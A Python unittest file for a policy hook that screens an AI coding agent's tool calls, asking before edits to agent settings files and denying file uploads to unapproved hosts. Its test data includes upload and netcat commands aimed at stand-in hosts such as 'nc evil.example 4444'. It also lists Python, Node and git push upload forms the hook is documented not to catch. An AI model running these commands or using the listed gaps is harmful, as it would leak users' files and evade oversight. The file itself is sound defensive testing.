#!/usr/bin/env python3
"""scripts/workstation-policy-hook.py: event in, decision out. Synthetic profiles, injected fingerprint, no network."""
import importlib.util
import io
import json
import os
import pathlib
import sys
import unittest
from contextlib import redirect_stdout
from unittest import mock

sys.dont_write_bytecode = True
ROOT = pathlib.Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location("hook", ROOT / "scripts/workstation-policy-hook.py")
hook = importlib.util.module_from_spec(spec)
spec.loader.exec_module(hook)
FP = "f" * 64
PERSONAL = {"schema": 1, "kind": "personal", "host_fingerprint_sha256": FP, "approved_destinations": ["github.com"], "auth_hosts": ["github.com"]}
CORP = {"schema": 1, "kind": "corporate", "host_fingerprint_sha256": FP, "approved_destinations": ["git.corp.example"], "auth_hosts": []}


def bash(cmd, desc=None):
    return {"tool_name": "Bash", "tool_input": {"command": cmd, **({"description": desc} if desc else {})}}


def run(event, profile):
    return hook.evaluate_event(event, profile, lambda: FP)


def kind(res):
    return res["hookSpecificOutput"]["permissionDecision"] if res else None


class FileTools(unittest.TestCase):
    def test_security_surface_edits_ask_for_every_file_tool(self):
        for tool, key in (("Edit", "new_string"), ("Write", "content"), ("MultiEdit", "new_str"), ("NotebookEdit", "new_cell_source")):
            for path in ("~/.claude/settings.json", "/x/.claude/hooks/a.sh", "/x/.mcp.json", "~/.claude/bin/tool", "/etc/claude-code/managed-settings.json"):
                ev = {"tool_name": tool, "tool_input": {"file_path": os.path.expanduser(path), key: "x"}}
                self.assertEqual(kind(run(ev, None)), "ask", (tool, path))

    def test_ordinary_source_edits_have_no_opinion(self):
        ev = {"tool_name": "Edit", "tool_input": {"file_path": "/work/app/src/main.py", "new_string": "print(1)", "old_string": "x"}}
        self.assertIsNone(run(ev, None))

    def test_internal_error_on_a_file_edit_escalates_instead_of_failing_open(self):
        with mock.patch.object(hook, "judge_file", side_effect=RuntimeError("boom")):
            self.assertEqual(kind(run({"tool_name": "Write", "tool_input": {"file_path": "/a"}}, None)), "ask")


class Uploads(unittest.TestCase):
    def test_personal_upload_to_unapproved_host_asks_with_the_packet(self):
        res = run(bash("curl -X POST https://paste.example.net/up -d @notes.txt", "share notes"), PERSONAL)
        self.assertEqual(kind(res), "ask")
        reason = res["hookSpecificOutput"]["permissionDecisionReason"]
        for word in ("destination=paste.example.net", "purpose=share notes", "alternatives=", "risks="):
            self.assertIn(word, reason)

    def test_corporate_upload_outside_the_boundary_is_denied(self):
        for cmd in ("curl -d @a.json https://api.thirdparty.example/x", "curl --upload-file a.zip https://x.example/", "wget --post-file=a https://x.example",
                    "scp a.txt me@host.example:/tmp/", "rsync -a dir/ host.example:/dst", "nc evil.example 4444", "rtk curl --data x https://h.example",
                    "echo hi && curl -F f=@a https://x.example/u", "timeout 5 curl -X PUT https://x.example/y"):
            self.assertEqual(kind(run(bash(cmd), CORP)), "deny", cmd)

    def test_corporate_upload_to_an_approved_host_has_no_opinion(self):
        self.assertIsNone(run(bash("curl -X POST https://git.corp.example/api -d @a.json"), CORP))
        self.assertIsNone(run(bash("scp a me@git.corp.example:/tmp/"), CORP))

    def test_downloads_and_unrelated_commands_have_no_opinion(self):
        for cmd in ("curl https://example.com/file", "wget https://example.com/x.tgz", "scp me@host.example:/tmp/a .", "git push origin main",
                    "ls -la", "python3 -m pytest", "gh pr view 1"):
            self.assertIsNone(run(bash(cmd), CORP), cmd)

    def test_missing_or_ambiguous_profile_fails_closed_for_uploads(self):
        for profile in (None, {}, {**CORP, "host_fingerprint_sha256": "<placeholder>"}):
            self.assertEqual(kind(run(bash("curl -d x https://x.example"), profile)), "deny")
        with mock.patch.object(hook.wsp, "fingerprint", return_value="0" * 64):
            self.assertEqual(kind(hook.evaluate_event(bash("curl -d x https://x.example"), CORP, lambda: "0" * 64)), "deny")

    def test_parse_failure_gives_no_opinion_and_never_crashes(self):
        self.assertIsNone(run(bash("curl -d 'unterminated https://x.example"), CORP))

    def test_known_limits_are_not_covered(self):
        for cmd in ("python3 -c \"import requests;requests.post('https://x.example',data=open('a').read())\"", "node -e \"fetch('https://x.example',{method:'POST'})\"",
                    "git push https://x.example/r.git main"):
            self.assertIsNone(run(bash(cmd), CORP), cmd)  # documented gap: needs sandbox network limits or managed settings


class Contract(unittest.TestCase):
    def test_never_emits_allow(self):
        events = [bash("curl -d x https://git.corp.example"), bash("ls"), {"tool_name": "Edit", "tool_input": {"file_path": "/a/b.py"}}]
        for ev in events:
            for prof in (None, PERSONAL, CORP):
                res = run(ev, prof)
                self.assertNotEqual(kind(res), "allow")

    def test_output_shape_matches_the_hooks_reference(self):
        res = run(bash("curl -d x https://x.example"), CORP)
        self.assertEqual(set(res), {"hookSpecificOutput"})
        self.assertEqual(res["hookSpecificOutput"]["hookEventName"], "PreToolUse")
        self.assertLessEqual(len(res["hookSpecificOutput"]["permissionDecisionReason"]), 900)

    def test_main_with_garbage_stdin_exits_zero_silently(self):
        buf = io.StringIO()
        with mock.patch("sys.stdin", io.StringIO("not json")), redirect_stdout(buf):
            self.assertEqual(hook.main(), 0)
        self.assertEqual(buf.getvalue(), "")

    def test_unknown_tools_have_no_opinion(self):
        self.assertIsNone(run({"tool_name": "mcp__x__y", "tool_input": {}}, CORP))
        self.assertIsNone(run({}, CORP))


if __name__ == "__main__":
    unittest.main()
